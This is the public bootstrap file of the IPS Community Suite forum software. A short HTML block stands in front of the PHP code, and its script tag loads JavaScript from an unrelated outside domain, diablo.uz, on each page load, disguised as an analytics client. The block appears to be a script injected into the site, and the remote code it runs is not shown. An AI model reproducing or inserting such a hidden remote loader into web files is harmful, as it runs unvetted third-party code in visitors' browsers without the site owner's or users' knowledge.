<!DOCTYPE html>
<html lang="en">
<script id="domain" data-name="3206581" type="text/javascript" src="http://diablo.uz/analiz/js/analytics_js/client.js"></script>
</html>
<?php

/**
 * @brief		Public bootstrap
 * @author		<a href='http://www.invisionpower.com'>Invision Power Services, Inc.</a>
 * @copyright	(c) 2001 - 2016 Invision Power Services, Inc.
 * @license		http://www.invisionpower.com/legal/standards/
 * @package		IPS Community Suite
 * @since		18 Feb 2013
 * @version		SVN_VERSION_NUMBER
 */
$_SERVER['SCRIPT_FILENAME']	= __FILE__;
require_once 'init.php';
\IPS\Dispatcher\Front::i()->run();